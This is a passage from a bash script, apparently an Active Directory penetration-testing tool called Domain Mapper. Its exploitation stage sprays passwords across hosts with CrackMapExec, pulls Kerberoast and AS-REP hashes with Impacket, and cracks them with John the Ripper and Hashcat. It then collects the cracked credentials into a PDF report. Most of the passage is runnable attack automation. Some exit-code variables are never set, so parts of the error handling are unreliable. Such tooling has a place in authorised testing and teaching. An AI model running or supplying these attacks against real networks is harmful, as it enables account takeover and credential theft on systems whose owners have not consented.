                echo -e "${YELLOW}[!] High-confidence vulnerabilities detected by Nmap '--script vuln'. See '${OUTPUT_DIR}/nmap_vuln_scan.txt' for full details.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
                VULNERABILITIES_FOUND="Found $vuln_count potential vulnerabilities. See ${OUTPUT_DIR}/nmap_vuln_scan.txt for details."
            else
                echo -e "${GREEN}[+] No high-confidence vulnerabilities detected by Nmap '--script vuln'.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
                VULNERABILITIES_FOUND="None"
            fi
        fi
    fi

    # 4.2. Intermediate: Execute domain-wide password spraying to identify weak credentials.
    if [ "$EXPLOIT_LEVEL" -ge 2 ]; then
        echo -e "${GREEN}[+] 4.2. Intermediate Exploitation: Executing domain-wide password spraying.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
        local users_file="${OUTPUT_DIR}/domain_users.txt" # File to store extracted users
        local spray_password_source_arg="$WORDLIST" # Now always uses WORDLIST
        local chosen_password_source_desc="wordlist '${WORDLIST}'"

        if [ "$ENUM_LEVEL" -ge 3 ] && [ -f "$users_file" ] && [ -s "$users_file" ]; then
            echo -e "${CYAN}[i] Domain users extracted from Advanced Enumeration will be used for password spraying with $chosen_password_source_desc.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            
            start_spinner "Performing password spraying"
            echo # Newline after spinner start

            local spray_cmd_array=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$users_file" -p "$spray_password_source_arg" -d "$AD_DOMAIN_NAME" --continue-on-success) # Changed from DOMAIN_NAME
            echo -e "${CYAN}Executing: ${BLUE}${spray_cmd_array[*]}${NC}" | tee -a "$EXPLOITATION_LOG"
            local spray_output=$("${spray_cmd_array[@]}" 2>&1) # Strip ANSI codes
            echo "$spray_output" | tee -a "$EXPLOITATION_LOG"
            stop_spinner
            echo # Newline after spinner
            if [ "$spray_exit_code" -ne 0 ]; then 
                echo -e "${RED}[!] ERROR: CrackMapExec password spraying failed with exit code $spray_exit_code. This might be due to invalid credentials, network issues, or account lockouts.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            fi
            {
                echo -e "\n--- Password Spraying Results (against extracted users) ---"
                echo "$spray_output"
            } | tee -a "$EXPLOITATION_LOG"

            # Parse cracked sprayed creds
            CRACKED_SPRAYED_CREDS=$(echo "$spray_output" | grep -E '\S+\s+\S+\s+Pwned!' | awk '{print $NF}' | tr '\n' ',' | sed 's/,$//')
        elif [ -n "$AD_USER" ] && [ -n "$AD_PASS" ]; then
            echo -e "${YELLOW}[!] No domain user list found from Advanced Enumeration. Spraying against the provided AD user only, using $chosen_password_source_desc.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            
            start_spinner "Performing password spraying against provided AD user"
            echo # Newline after spinner start

            local spray_cmd_array=(crackmapexec smb "$(echo "$live_hosts" | tr ',' ' ')" -u "$AD_USER" -p "$AD_PASS" -d "$AD_DOMAIN_NAME" --continue-on-success) # Changed from DOMAIN_NAME
            echo -e "${CYAN}Executing: ${BLUE}${spray_cmd_array[*]}${NC}" | tee -a "$EXPLOITATION_LOG"
            local spray_output=$("${spray_cmd_array[@]}" 2>&1) # Strip ANSI codes
            echo "$spray_output" | tee -a "$EXPLOITATION_LOG"
            stop_spinner
            echo # Newline after spinner
            if [ "$spray_exit_code" -ne 0 ]; then 
                echo -e "${RED}[!] ERROR: CrackMapExec password spraying failed with exit code $spray_exit_code. This might be due to invalid credentials, network issues, or account lockouts.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            fi
            {
                echo -e "\n--- Password Spraying Results (against provided AD user) ---"
                echo "$spray_output"
            } | tee -a "$EXPLOITATION_LOG"
            CRACKED_SPRAYED_CREDS=$(echo "$spray_output" | grep -E '\S+\S+\s+Pwned!' | awk '{print $NF}' | tr '\n' ',' | sed 's/,$//')
        else
            echo -e "${RED}[!] Cannot perform password spraying: No AD credentials provided or no user list available for spraying.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
        fi
    fi

    # 4.3. Advanced: Extract and attempt to crack Kerberos tickets using pre-supplied passwords.
    if [ "$EXPLOIT_LEVEL" -ge 3 ]; then
        echo -e "${GREEN}[+] 4.3. Advanced Exploitation: Extracting and attempting to crack Kerberos tickets.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
        if [ -z "$AD_USER" ] || [ -z "$AD_PASS" ] || [ -z "$DOMAIN_CONTROLLER_IP" ]; then
            echo -e "${YELLOW}[!] WARNING: Advanced Exploitation (Kerberoasting/AS-REP Roasting) requires AD credentials and a discovered DC IP. Skipping.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            return # Skip if credentials or DC IP are missing
        fi
        if [ -z "$AD_DOMAIN_NAME" ]; then # Changed from DOMAIN_NAME
            echo -e "${RED}[!] ERROR: Advanced Enumeration (Level 3) requires a domain name to be provided. Skipping.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            return # Skip if domain name is missing
        fi

        echo -e "${GREEN}[+] Performing Advanced Exploitation: Kerberoasting and AS-REP Roasting${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"

        local kerb_hashes_file="${OUTPUT_DIR}/kerberoast_hashes.txt"
        local asrep_hashes_file="${OUTPUT_DIR}/asrep_hashes.txt"
        local cracked_asrep_file="${OUTPUT_DIR}/cracked_asrep.txt"
        local cracked_kerb_file="${OUTPUT_DIR}/cracked_kerb.txt"
        local users_file="${OUTPUT_DIR}/domain_users.txt" # Ensure users file is available for AS-REP

        # --- Kerberoasting ---
        echo -e "\n--- Kerberoasting: Ticket Extraction (Impacket GetUserSPNs) ---" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
        
        start_spinner "Extracting Kerberos tickets"
        echo # Newline after spinner start
        rm -f "$kerb_hashes_file" # Clean old output file
        # Corrected syntax for impacket-GetUserSPNs
        local kerb_extract_cmd_array=(impacket-GetUserSPNs "${AD_DOMAIN_NAME}/${AD_USER}:${AD_PASS}" -dc-ip "$DOMAIN_CONTROLLER_IP" -request -outputfile "$kerb_hashes_file") # Changed from DOMAIN_NAME
        echo -e "${CYAN}Executing: ${BLUE}${kerb_extract_cmd_array[*]}${NC}" | tee -a "$EXPLOITATION_LOG"
        local kerb_extract_output=$("${kerb_extract_cmd_array[@]}" 2>&1) # Strip ANSI codes
        echo "$kerb_extract_output" | tee -a "$EXPLOITATION_LOG"
        stop_spinner
        echo # Newline after spinner
        if [ "$impacket_kerb_exit_code" -ne 0 ]; then 
            echo -e "${RED}[!] ERROR: Impacket GetUserSPNs failed with exit code $impacket_kerb_exit_code. Check DC IP, domain credentials, and network connectivity.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
        fi

        if [ -s "$kerb_hashes_file" ]; then
            echo -e "${GREEN}[+] Kerberoastable SPN hashes extracted. Attempting to crack with John The Ripper.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            
            start_spinner "Cracking Kerberos hashes with John The Ripper"
            echo # Newline after spinner start
            rm -f "$cracked_kerb_file" # Clean old output file
            local john_kerb_cmd_array=(john --wordlist="$WORDLIST" "$kerb_hashes_file" --format=krb5tgs --session="kerb_crack_session_${TIMESTAMP}")
            echo -e "${CYAN}Executing: ${BLUE}${john_kerb_cmd_array[*]}${NC}" | tee -a "$EXPLOITATION_LOG"
            {
                # Strip ANSI escape codes from John's output before teeing
                "${john_kerb_cmd_array[@]}" 2>&1 | tee -a "$EXPLOITATION_LOG"
                echo -e "\n--- John The Ripper Cracked Kerberos Hashes ---" | tee -a "$EXPLOITATION_LOG"
                local cracked_output_array=(john --show --format=krb5tgs "$kerb_hashes_file")
                local cracked_output=$("${cracked_output_array[@]}" 2>&1)
                echo "$cracked_output" | tee -a "$EXPLOITATION_LOG"
                echo "$cracked_output" > "$cracked_kerb_file" # Save cracked output
            }
            local john_kerb_exit_code=${PIPESTATUS[0]}
            stop_spinner
            echo # Newline after spinner
            if [ "$john_kerb_exit_code" -ne 0 ]; then 
                echo -e "${YELLOW}[!] WARNING: John The Ripper for Kerberoasting failed or found no cracks with exit code $john_kerb_exit_code. This could mean no hashes were cracked with the provided wordlist or an issue with John.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            fi
            # Check if cracked_kerb_file exists and is not empty before processing
            if [ -f "$cracked_kerb_file" ] && [ -s "$cracked_kerb_file" ]; then
                CRACKED_KERBEROAST_HASHS=$(grep ':[^:]*$' "$cracked_kerb_file" | awk -F':' '{print $1" (Password: "$NF")"}' | paste -s -d, -)
            else
                CRACKED_KERBEROAST_HASHS="None"
            fi
        else
            echo -e "${CYAN}[i] No Kerberoastable accounts found.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            CRACKED_KERBEROAST_HASHS="None" # Ensure it's explicitly set to None if no hashes are found
        fi

        # --- AS-REP Roasting ---
        # AS-REP Roasting requires a user list, preferably from advanced enumeration
        if [ -f "$users_file" ] && [ -s "$users_file" ]; then
            echo -e "${CYAN}[i] AS-REP Roasting: Hash Extraction (Impacket GetNPUsers)${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            
            start_spinner "Extracting AS-REP hashes"
            echo # Newline after spinner start
            rm -f "$asrep_hashes_file" # Clean old output file
            local asrep_extract_cmd_array=(impacket-GetNPUsers -dc-ip "$DOMAIN_CONTROLLER_IP" "${AD_DOMAIN_NAME}/" -usersfile "$users_file" -format hashcat -outputfile "$asrep_hashes_file") # Changed from DOMAIN_NAME
            echo -e "${CYAN}Executing: ${BLUE}${asrep_extract_cmd_array[*]}${NC}" | tee -a "$EXPLOITATION_LOG"
            local asrep_extract_output=$("${asrep_extract_cmd_array[@]}" 2>&1) # Strip ANSI codes
            echo "$asrep_extract_output" | tee -a "$EXPLOITATION_LOG"
            stop_spinner
            echo # Newline after spinner
            if [ "$impacket_asrep_exit_code" -ne 0 ]; then 
                echo -e "${RED}[!] ERROR: Impacket GetNPUsers failed with exit code $impacket_asrep_exit_code. Check DC IP, user file, and ensure vulnerable users exist.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            fi

            if [ -s "$asrep_hashes_file" ]; then
                echo -e "${GREEN}[+] AS-REP hashes extracted. Attempting to crack with Hashcat.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
                
                start_spinner "Cracking AS-REP hashes with Hashcat"
                echo # Newline after spinner start
                rm -f "$cracked_asrep_file" # Clean old output file
                local hashcat_asrep_cmd_array=(hashcat -m 18200 "$asrep_hashes_file" "$WORDLIST" -o "$cracked_asrep_file")
                echo -e "${CYAN}Executing: ${BLUE}${hashcat_asrep_cmd_array[*]}${NC}" | tee -a "$EXPLOITATION_LOG"
                {
                    # Strip ANSI escape codes from Hashcat's output before teeing
                    "${hashcat_asrep_cmd_array[@]}" 2>&1 | tee -a "$EXPLOITATION_LOG"
                    if [ -f "$cracked_asrep_file" ] && [ -s "$cracked_asrep_file" ]; then
                        echo -e "\n--- Hashcat Cracked AS-REP Hashes ---" | tee -a "$EXPLOITATION_LOG"
                        cat "$cracked_asrep_file" | tee -a "$EXPLOITATION_LOG"
                    else
                        echo -e "${CYAN}[i] No AS-REP hashes were cracked by Hashcat.${NC}" | tee -a "$EXPLOITATION_LOG"
                    fi 
                }
                local hashcat_asrep_exit_code=${PIPESTATUS[0]}
                stop_spinner
                echo # Newline after spinner
                if [ "$hashcat_asrep_exit_code" -ne 0 ]; then 
                    echo -e "${YELLOW}[!] WARNING: Hashcat for AS-REP roasting failed or found no cracks with exit code $hashcat_asrep_exit_code. This could mean no hashes were cracked with the provided wordlist or an issue with Hashcat.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
                fi
                # Check if cracked_asrep_file exists and is not empty before processing
                if [ -f "$cracked_asrep_file" ] && [ -s "$cracked_asrep_file" ]; then
                    CRACKED_ASREP_HASHS=$(grep ':' "$cracked_asrep_file" | awk -F':' '{print $1" (Password: "$NF")"}' | paste -s -d, -)
                else
                    CRACKED_ASREP_HASHS="None"
                fi
            else
                echo -e "${CYAN}[i] No AS-REP hashes found from target users. Make sure users without 'Do not require Kerberos preauthentication' are targeted.${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
                CRACKED_ASREP_HASHS="None" # Ensure it's explicitly set to None if no hashes are found
            fi 
        else
            echo -e "${CYAN}[i] Cannot perform AS-REP Roasting: No domain user list available (requires Advanced Enumeration).${NC}" | tee -a "$LOG_FILE" | tee -a "$EXPLOITATION_LOG"
            CRACKED_ASREP_HASHS="None" # Ensure it's explicitly set to None if no user list
        fi
    fi
} # End of run_exploitation function


# --- Function to escape LaTeX special characters ---
# This function takes a string and escapes characters that have special meaning in LaTeX.
escape_latex_special_chars() {
    local input_string="$1"
    # Order matters for some replacements (e.g., \ before { or })
    local escaped_string="${input_string//\\/\\\\}" # Escape backslashes first
    escaped_string="${escaped_string//&/\\&}"
    escaped_string="${escaped_string//%/\\%}"
    escaped_string="${escaped_string//\$/\\\$}"
    escaped_string="${escaped_string//#/\\#}"
    escaped_string="${escaped_string//_/\\_}"
    escaped_string="${escaped_string//\{/\\{}"
    escaped_string="${escaped_string//\}/\\}}"
    escaped_string="${escaped_string//~/\\textasciitilde{}}" # ~
    escaped_string="${escaped_string//^/\\textasciicircum{}}" # ^
    escaped_string="${escaped_string//\[/\\[}" # Escape [
    escaped_string="${escaped_string//\]/\\]}" # Escape ]
    escaped_string="${escaped_string//</\\textless{}}" # Escape <
    escaped_string="${escaped_string//>/\\textgreater{}}" # Escape >
    echo "$escaped_string"
}


# --- 5. Results / Reporting ---
# 5.1. For every execution, save the output in a PDF file.
# Function to create a summary for the report
generate_summary_file() {
    print_stage "5. Creating Report Summary" | tee -a "$LOG_FILE"
    echo "# Domain Mapper Report" > "$SUMMARY_FILE"
    echo "" >> "$SUMMARY_FILE"
    echo "**Date:** $(date)" >> "$SUMMARY_FILE"
    echo "" >> "$SUMMARY_FILE"
    echo "## Target Configuration" >> "$SUMMARY_FILE"
    echo "- **Network Range:** \`$(escape_latex_special_chars "$TARGET_RANGE")\`" >> "$SUMMARY_FILE"
    echo "- **Domain Name:** \`$(escape_latex_special_chars "$AD_DOMAIN_NAME")\`" >> "$SUMMARY_FILE" # Changed from DOMAIN_NAME
    echo "" >> "$SUMMARY_FILE"
    echo "## Selected Operation Levels" >> "$SUMMARY_FILE"
    echo "- **Scanning:** Level $SCAN_LEVEL" >> "$SUMMARY_FILE"
    echo "- **Enumeration:** Level $ENUM_LEVEL" >> "$SUMMARY_FILE"
    echo "- **Exploitation:** Level $EXPLOIT_LEVEL" >> "$SUMMARY_FILE"
    echo "" >> "$SUMMARY_FILE"
    echo "## Key Findings" >> "$SUMMARY_FILE"
    if [ -n "$DOMAIN_CONTROLLER_IP" ]; then
        echo "- **Discovered Domain Controller IP:** \`$(escape_latex_special_chars "$DOMAIN_CONTROLLER_IP")\`" >> "$SUMMARY_FILE"
        if [ -n "$DC_HOSTNAME" ]; then
            echo "- **Discovered Domain Controller Hostname:** \`$(escape_latex_special_chars "$DC_HOSTNAME")\`" >> "$SUMMARY_FILE"
        fi
    else
        echo "- **Domain Controller:** Not Discovered" >> "$SUMMARY_FILE"
    fi
    if [ -n "$DHCP_SERVER" ]; then
        echo "- **Discovered DHCP Server IP:** \`$(escape_latex_special_chars "$DHCP_SERVER")\`" >> "$SUMMARY_FILE"
    else
        echo "- **DHCP Server:** Not Found" >> "$SUMMARY_FILE"
    fi

    if [ -n "$DISCOVERED_LIVE_HOSTS" ]; then
        echo "- **Found Live Hosts (Overall TCP):** $(escape_latex_special_chars "$DISCOVERED_LIVE_HOSTS")" >> "$SUMMARY_FILE"
    else
        echo "- **Live Hosts (Overall TCP - Fallback to full range):** $(escape_latex_special_chars "$TARGET_RANGE")" >> "$SUMMARY_FILE"
    fi

    if [ -n "$DISCOVERED_LIVE_HOSTS_TCP_2_2" ]; then
        echo "- **Found Live Hosts (From Intermediate TCP Scan 2.2):** $(escape_latex_special_chars "$DISCOVERED_LIVE_HOSTS_TCP_2_2")" >> "$SUMMARY_FILE"
    else
        echo "- **Found Live Hosts (From Intermediate TCP Scan 2.2):** Not discovered" >> "$SUMMARY_FILE"
    fi

    if [ -n "$DISCOVERED_LIVE_HOSTS_UDP_2_3" ]; then
        echo "- **Found Live Hosts (From Advanced UDP Scan 2.3):** $(escape_latex_special_chars "$DISCOVERED_LIVE_HOSTS_UDP_2_3")" >> "$SUMMARY_FILE"
    else
        echo "- **Found Live Hosts (From Advanced UDP Scan 2.3):** Not discovered" >> "$SUMMARY_FILE"
    fi

    if [ -n "$DISCOVERED_TCP_PORTS" ]; then
        echo "- **Discovered Open TCP Ports:** $(escape_latex_special_chars "$DISCOVERED_TCP_PORTS")" >> "$SUMMARY_FILE"
    else
        echo "- **Open TCP Ports:** Not discovered" >> "$SUMMARY_FILE"
    fi
    if [ -n "$DISCOVERED_UDP_PORTS" ]; then
        echo "- **Discovered Open UDP Ports:** $(escape_latex_special_chars "$DISCOVERED_UDP_PORTS")" >> "$SUMMARY_FILE"
    else
        echo "- **Open UDP Ports:** Not discovered" >> "$SUMMARY_FILE"
    fi
    
    if [ -n "$DISCOVERED_SMB_SHARES" ]; then
        echo "- **Discovered SMB Shares:** $(escape_latex_special_chars "$DISCOVERED_SMB_SHARES")" >> "$SUMMARY_FILE"
    else
        echo "- **SMB Shares:** Not discovered" >> "$SUMMARY_FILE"
    fi

    if [ -n "$DISCOVERED_DOMAIN_USERS" ]; then
        echo "- **Discovered Domain Users:** $(escape_latex_special_chars "$DISCOVERED_DOMAIN_USERS")" >> "$SUMMARY_FILE"
    else
        echo "- **Domain Users:** Not discovered" >> "$SUMMARY_FILE"
    fi

    if [ -n "$CRACKED_SPRAYED_CREDS" ]; then
        echo "- **Cracked Credentials (Password Spraying):** $(escape_latex_special_chars "$CRACKED_SPRAYED_CREDS")" >> "$SUMMARY_FILE"
    else
        echo "- **Cracked Credentials (Password Spraying):** None" >> "$SUMMARY_FILE"
    fi
    if [ -n "$CRACKED_KERBEROAST_HASHS" ]; then
        echo "- **Cracked Kerberoast Hashes:** $(escape_latex_special_chars "$CRACKED_KERBEROAST_HASHS")" >> "$SUMMARY_FILE"
    else
        echo "- **Cracked Kerberoast Hashes:** None" >> "$SUMMARY_FILE"
    fi
    if [ -n "$CRACKED_ASREP_HASHS" ]; then
        echo "- **Cracked AS-REP HasHS:** $(escape_latex_special_chars "$CRACKED_ASREP_HASHS")" >> "$SUMMARY_FILE"
    else
        echo "- **Cracked AS-REP HasHS:** None" >> "$SUMMARY_FILE"
    fi
    if [ -n "$VULNERABILITIES_FOUND" ]; then
        echo "- **Discovered Vulnerabilities:** $(escape_latex_special_chars "$VULNERABILITIES_FOUND")" >> "$SUMMARY_FILE"
    else
        echo "- **Discovered Vulnerabilities:** None" >> "$SUMMARY_FILE"
    fi
}


generate_report() {
    print_stage "5. Results / Reporting (5.1. Save output in PDF file)" | tee -a "$LOG_FILE"
    if command -v pandoc &> /dev/null; then
        # List of files to include in the report, ordered logically
        local report_files=(
            "$SUMMARY_FILE"
            "$SCANNING_LOG"
            "$ENUMERATION_LOG"
            "$EXPLOITATION_LOG"
            "${OUTPUT_DIR}/nmap_basic_host_discovery.txt" # Initial Nmap host discovery output
            "${OUTPUT_DIR}/nmap_intermediate_scan.txt" # Intermediate Nmap TCP scan output
            "${OUTPUT_DIR}/udp_masscan_scan.txt" # Masscan UDP raw output
            "${OUTPUT_DIR}/nmap_udp_fallback_scan.txt" # Added: Nmap UDP fallback scan output
            "${OUTPUT_DIR}/nmap_tcp_service_scan.txt" # Dedicated TCP service scan output
            "${OUTPUT_DIR}/nmap_udp_service_scan.txt" # Dedicated UDP service scan output
            "${OUTPUT_DIR}/nmap_all_service_scan.txt" # Consolidated Nmap TCP/UDP service scan output
            "${OUTPUT_DIR}/nmap_smb_os_discovery.txt" # Nmap SMB OS Discovery output (renamed)
            "${OUTPUT_DIR}/nmap_dhcp_discover.txt" # Nmap DHCP Discover output
            "${OUTPUT_DIR}/tshark_dhcp_discover.txt" # Added: Tshark DHCP Discover output
            "${OUTPUT_DIR}/nmap_key_services_scan.txt" # Added: Dedicated Nmap scan for key services
            "${OUTPUT_DIR}/nmap_smb_shares.txt" # Nmap SMB shares output
            "${OUTPUT_DIR}/nmap_other_nse_enum.txt" # Other NSE scripts output
            "${OUTPUT_DIR}/enum4linux_output.txt" # Added enum4linux output
            "${OUTPUT_DIR}/dns_enum_output.txt" # Added dig DNS enumeration output
            "${OUTPUT_DIR}/nmap_vuln_scan.txt" # Nmap vulnerability scan output
            "${OUTPUT_DIR}/domain_users.txt" # List of extracted users
            "${OUTPUT_DIR}/kerberoast_hashes.txt" # Raw Kerberoast hashes
            "${OUTPUT_DIR}/cracked_kerb.txt" # Cracked Kerberoast hashes
            "${OUTPUT_DIR}/asrep_hashes.txt" # Raw AS-REP hashes
            "${OUTPUT_DIR}/cracked_asrep.txt" # Cracked AS-REP hashes
            "$LOG_FILE" # Include the main script execution log as well
        )

        local temp_report_md="${OUTPUT_DIR}/full_report.md"
        > "$temp_report_md" # Create/clear a temporary Markdown file for pandoc input

        # Append all generated detailed outputs into the temporary Markdown file.
        for file in "${report_files[@]}"; do
            if [ -e "$file" ] && [ -s "$file" ]; then # Check if file exists and is not empty
                echo -e "\n\n### Contents of file: $(basename "$file") ###\n\n" >> "$temp_report_md"
                # For raw log files, wrap content in a Markdown code block to prevent LaTeX issues
                echo '```text' >> "$temp_report_md" # Start code block
                # Pipe content through sed to remove ANSI escape codes, then through fold for line breaks
                cat "$file" | fold -s -w 105 >> "$temp_report_md"
                echo '```' >> "$temp_report_md" # End code block
                echo "" >> "$temp_report_md" # Add a newline for separation
            fi
        done
        
        echo -e "${CYAN}[i] 5.1. Generating PDF report using Pandoc: ${PDF_REPORT_FILE}${NC}" | tee -a "$LOG_FILE"
        start_spinner "Generating PDF report with Pandoc"
        echo # Newline after spinner start
        # Convert the aggregated Markdown file to PDF with smaller margins
        pandoc "$temp_report_md" -o "$PDF_REPORT_FILE" --metadata title="Domain Mapper Report for ${TARGET_RANGE}" -s -V geometry:margin=0.5in
        local pandoc_exit_code=$? #exit check $? ${PIPESTATUS[0]}
        stop_spinner
        echo # Newline after spinner

        if [ "$pandoc_exit_code" -eq 0 ]; then 
            echo -e "${GREEN}[+] PDF report successfully generated: ${PDF_REPORT_FILE}${NC}" | tee -a "$LOG_FILE"
        else
            echo -e "${RED}[!] Failed to generate PDF report. Please check your pandoc installation and the log files for errors.${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}[i] The raw text log is available at: ${LOG_FILE}${NC}" | tee -a "$LOG_FILE"
        fi
        rm -f "$temp_report_md" # Clean up the temporary markdown file
    else
        echo -e "${RED}[!] Pandoc is not installed. Cannot generate PDF report.${NC}" | tee -a "$LOG_FILE"
        echo -e "${YELLOW}[i] All output has been saved to the log file: ${LOG_FILE}${NC}" | tee -a "$LOG_FILE"
    fi
}

# --- Clean up function ---
cleanup_files() {
    # Initialize confirm_cleanup to avoid unbound variable error if read fails or is skipped
    local confirm_cleanup="" 

    # This function is called at the end. The OUTPUT_DIR is now guaranteed to exist.
    # It checks if any operational levels were selected to decide on cleanup prompt.
    if [ "$SCAN_LEVEL" -gt 0 ] || [ "$ENUM_LEVEL" -gt 0 ] || [ "$EXPLOIT_LEVEL" -gt 0 ]; then
        echo -e "${CYAN}[i] Output directory '${OUTPUT_DIR}' created. ${NC}" | tee -a "$LOG_FILE"

        # Check if the script is running in an interactive terminal
        if [[ -t 0 ]]; then # -t 0 checks if stdin is a terminal
            echo -e "${YELLOW}Do you want to delete script logs in directory '${OUTPUT_DIR}'? (Type 'y' to delete all files except the PDF, press Enter or 'n' to keep everything): ${NC}\c"
            # Use a timeout for read in case of unexpected non-interactive behavior, though -t 0 should prevent it
            if ! read -t 10 confirm_cleanup; then # Read with a 10-second timeout
                echo -e "\n${YELLOW}[!] No input received within 10 seconds. Keeping all files.${NC}" | tee -a "$LOG_FILE"
                confirm_cleanup="n" # Default to 'n' if no input or timeout
            fi
        else
            echo -e "${CYYAN}[i] Running in non-interactive mode. Keeping all output files by default.${NC}" | tee -a "$LOG_FILE"
            confirm_cleanup="n" # Default to 'n' for non-interactive execution
        fi
        
        # If user inputs 'y' or 'Y', delete files, otherwise (empty input or 'n') keep them.
        if [[ "$confirm_cleanup" =~ ^[Yy]$ ]]; then 
            echo -e "${CYAN}[i] Deleting all files in '${OUTPUT_DIR}', except the PDF report...${NC}" | tee -a "$LOG_FILE"
            start_spinner "Cleaning up output directory"
            echo # Newline after spinner start
            # Iterate through all items in the output directory
            for item in "$OUTPUT_DIR"/* "$OUTPUT_DIR"/.; do # Include dot files
                # Ensure it's a file/directory and not the PDF, and not . or ..
                # This explicitly checks that the current item is NOT the PDF report.
                # All other files, including the script_log.txt, will be deleted.
                if [ -e "$item" ] && [ "$item" != "$PDF_REPORT_FILE" ] && [ "$(basename "$item")" != "." ] && [ "$(basename "$item")" != ".." ]; then
                    rm -rf "$item"
                fi
            done
            stop_spinner
            echo -e "${GREEN}[+] Output directory cleared, only PDF report '${PDF_REPORT_FILE}' retained.${NC}" | tee -a "$LOG_FILE"
        else
            echo -e "${CYAN}[i] Output directory '${OUTPUT_DIR}' kept.${NC}" | tee -a "$LOG_FILE"
        fi
    else
        # Directory was created, but no operations ran. Inform user and don't prompt for deletion.
        echo -e "${CYAN}[i] No scanning, enumeration, or exploitation tasks were performed. The output directory '${OUTPUT_DIR}' contains only the main script log.${NC}" | tee -a "$LOG_FILE"
        # No prompt, just keep the directory with the main log.
    fi
}


# ==============================================================================
# MAIN EXECUTION BLOCK
# ==============================================================================

# --- Check for root privileges ---
if [ "$EUID" -ne 0 ] && [[ ! " $* " =~ " --help " ]]; then
    echo -e "${RED}Please run this script with sudo for full functionality.${NC}"
    exit 1
fi

# --- Argument Parsing / Initial Help Prompt ---
if [[ " $* " =~ " --help " ]]; then
    show_help
    exit 0
elif [ "$#" -eq 0 ]; then # If no arguments provided, ask to show help
    # Modified this section to explicitly echo the prompt and then read input
    echo -e "${YELLOW}Do you want to see the help menu before starting? (y/n) (Type 'y' or 'n' and press Enter): ${NC}\c"
    read show_help_at_start
    if [[ "$show_help_at_start" =~ ^[Yy]$ ]]; then 
        show_help
        exit 0 # Exit after showing help if confirmed interactively
    fi
    echo -e "${NC}\c" # Reset color after prompt input if not exiting


fi

# --- Create Output Directory and Main Log File (UNCONDITIONAL) ---
# Create directory as root (script is run with sudo)
mkdir -p "$OUTPUT_DIR" || { echo -e "${RED}[!] FATAL ERROR: Failed to create output directory ${OUTPUT_DIR}. Exiting.${NC}"; exit 1; }
OUTPUT_DIR_CREATED=1 # Set flag as directory is always created now

# Initialize main log file. Use > to ensure a fresh log for each run.
echo "--- Script Execution Log (${TIMESTAMP}) ---" > "$LOG_FILE"
# The NC is now correctly consumed by echo -e due to the new variable definition
echo -e "${GREEN}[+] Output directory created: ${OUTPUT_DIR}${NC}" | tee -a "$LOG_FILE"

# --- Check for required dependencies (NEWLY ADDED CALL) ---
check_dependencies

# --- Mode Selection ---
get_user_input

# Create phase-specific log files only if their respective levels are selected
# These will be written to by tee during execution.
if [ "$SCAN_LEVEL" -gt 0 ]; then
    touch "$SCANNING_LOG"
fi
if [ "$ENUM_LEVEL" -gt 0 ]; then
    touch "$ENUMERATION_LOG"
fi
if [ "$EXPLOIT_LEVEL" -gt 0 ]; then
    touch "$EXPLOITATION_LOG"
fi


# --- Execution Flow ---
# These functions will only run if their respective levels are > 0
run_scanning
run_enumeration
run_exploitation

# Generate summary and report only if the directory was created (always true now)
# and if any operation was selected.
if [ "$SCAN_LEVEL" -gt 0 ] || [ "$ENUM_LEVEL" -gt 0 ] || [ "$EXPLOIT_LEVEL" -gt 0 ]; then
    generate_summary_file
    generate_report
fi

# Final cleanup
cleanup_files

# Final execution message based on whether operations was performed
print_header "EXECUTION FINISHED" | tee -a "$LOG_FILE"
if [ "$SCAN_LEVEL" -eq 0 ] && [ "$ENUM_LEVEL" -eq 0 ] && [ "$EXPLOIT_LEVEL" -eq 0 ]; then
    echo -e "${YELLOW}No scanning, enumeration, or exploitation tasks were performed. The output directory '${OUTPUT_DIR}' contains only the main script log.${NC}" | tee -a "$LOG_FILE"
else
    echo -e "${GREEN}All tasks are complete. Check the directory '${OUTPUT_DIR}' for all output files, including the PDF report.${NC}" | tee -a "$LOG_FILE"
fi

